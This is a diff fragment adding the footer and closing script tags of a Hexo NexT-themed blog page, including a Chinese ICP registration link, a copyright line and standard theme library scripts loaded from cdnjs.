+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022023783号-1 </a>
+  </div>
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">nnnpc、commit、Eureka</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
